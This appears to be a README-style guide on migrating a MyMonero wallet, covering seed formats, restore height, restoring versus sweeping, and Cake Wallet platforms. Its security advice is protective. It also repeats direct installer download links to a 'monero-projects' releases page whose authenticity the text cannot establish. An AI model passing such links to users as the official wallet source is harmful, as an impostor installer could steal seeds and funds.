<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Migration Checklist</h1>
<p align="center">A calm sequence for preparing a wallet restore or a separate funds transfer.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Before changing how you access MyMonero, identify your seed format, secure your backup, choose whether to restore or send funds, and plan for synchronization. Restoring the seed gives access to the same wallet; sweeping sends funds to a different wallet in a separate transaction.

## You'll see this if
- You are moving from MyMonero desktop to Cake Wallet.
- MyMonero hosted login is unavailable and you need another access plan.
- You want to move funds into a new wallet rather than restore the existing one.
- You need a checklist to reduce avoidable mistakes.

## Why it happens
MyMonero hosted servers and web wallet login stopped. Its final desktop release is v1.3.3. The old app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. The available paths are to keep using the desktop application or restore the seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing.

MyMonero seeds can be 13 words (MyMonero-specific legacy format) or 25 words (standard Monero). A migration can refer to restoring the existing wallet or making a transaction to a new wallet; these are not interchangeable. A restore requires scanning from a restore height, where earlier is safer but slower. A sweep is a send-all transaction, with applicable fees and destination risks. See [the migration overview](./mymonero-to-cake-wallet-migration.md) and [restore height guide](./mymonero-restore-height-explained.md).

---

## Fix
1. **Choose the objective.** Write down whether you need access to the same wallet on a different platform or want a separate new wallet funded by a transaction. If you only need access, restoration may be enough. If you want new wallet keys, plan a separate send or sweep.
2. **Check platform fit.** Cake Wallet is available on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. MyMonero desktop’s final release is v1.3.3, but it is no longer maintained. Do not assume a hosted web login is still available.
3. **Locate the recovery phrase privately.** Find the backup in a place you control. Do not use a screenshot, email, or chat as a convenient substitute. Never send the words to a person, website, or support desk; nobody legitimate asks for your seed.
4. **Identify its format.** Count the words in private. Thirteen words means the MyMonero-specific legacy format; 25 words means standard Monero. Keep spelling and sequence intact. Review [the seed format guide](./mymonero-seed-13-vs-25-words.md) if unclear.
5. **Verify the app source.** Install Cake Wallet from a trusted distribution channel for your platform. Do not accept an installer sent by a stranger. If retaining MyMonero desktop, the final release is listed on [GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3); confirm that a download matches the intended release information before use.
6. **Prepare your restore details.** Choose a reliable restore height at or before the earliest activity you need. If unknown, an earlier height is safer but lengthens scanning. Keep this non-secret information separate from the seed. Do not invent a precise height because a form requires one.
7. **Restore without exposing the phrase.** Select restore existing wallet, then the correct seed format. Enter words only in the app you intended to install. If it rejects the phrase, stop and check format and spelling against your own backup; never send it to someone for inspection.
8. **Allow synchronization.** Keep the app connected as required and wait for the scan to complete. A zero balance while scanning can be temporary. If prior transactions are absent after scanning, review the height rather than assuming the funds are gone.
9. **If moving funds, prepare the recipient first.** Create or open the new wallet yourself and obtain its address directly. Independently compare it before sending. A sweep sends all available funds, subject to fee and wallet behavior. Do not take a destination address from unsolicited messages.
10. **Confirm and preserve records.** Review the amount, fee, and destination on your own screen. Afterward, keep the new wallet’s seed securely backed up and retain useful non-secret records, such as the restore height and app choice.

> [!TIP]
> Use separate notes for non-secret setup details and your recovery phrase. Knowing a restore height can help later without making the seed easier to expose.

> [!WARNING]
> Do not let anyone remotely operate your wallet or request recovery words. A migration should never require disclosing the seed to a helper.

## If that did not work
If a seed is rejected, confirm its word count and that the restore flow supports that specific format. Check spelling and order using your offline record. Avoid guessing at missing words, testing on websites, or sharing a partial phrase. See [seed not accepted](./mymonero-seed-not-accepted.md).

If the wallet restores but shows no balance, wait for the scan to finish, then check the restore height. A late height can miss earlier transactions; an earlier height takes longer. Follow [zero balance troubleshooting](./mymonero-balance-shows-zero.md). An error 523 is general guidance that a server connection is unavailable, not a diagnosis of the seed.

If you are unsure whether to restore or sweep, pause. Restoring is not a transfer; sweeping sends funds on-chain. Review the destination and fee only when ready. Historically MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere; do not assume that this is a current fee.

## Prevention
Keep a readable offline backup and know whether it has 13 or 25 words. Record a reliable restore height separately if known. Review the platform and maintenance status of your chosen application before entering a seed. For any transaction, verify the destination address on the receiving wallet and make sure you understand the fee. Ignore urgent private messages offering recovery or asking for sensitive information. Treat the old MyMonero desktop app as unmaintained even though it still opens wallets and sends XMR.

## FAQ
<details><summary>Do I need to sweep when switching wallets?</summary>

No. Restoring the same seed gives access to the same wallet. Sweeping is a separate send to a different wallet.

</details>

<details><summary>What if I do not know the restore height?</summary>

Use an earlier conservative point. It is safer for including older activity but makes scanning slower.

</details>

<details><summary>Can I use Cake Wallet on Windows desktop?</summary>

Windows desktop builds are paused at the time of writing. Cake Wallet runs on iOS, Android, macOS, and Linux.

</details>

<details><summary>Should support verify my seed?</summary>

No. Never share the phrase or private keys. Check your own backup privately.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero to Cake Wallet Migration](./mymonero-to-cake-wallet-migration.md) | How to move your wallet access carefully and keep control of your XMR. |
| [Restore a MyMonero 13-Word Seed](./mymonero-13-word-seed-restore.md) | Recognize the legacy seed format and restore it without exposing your recovery phrase. |
| [Migrate a MyMonero 25-Word Seed](./mymonero-25-word-seed-migration.md) | Restore a standard Monero phrase in another supported wallet and scan from a suitable height. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
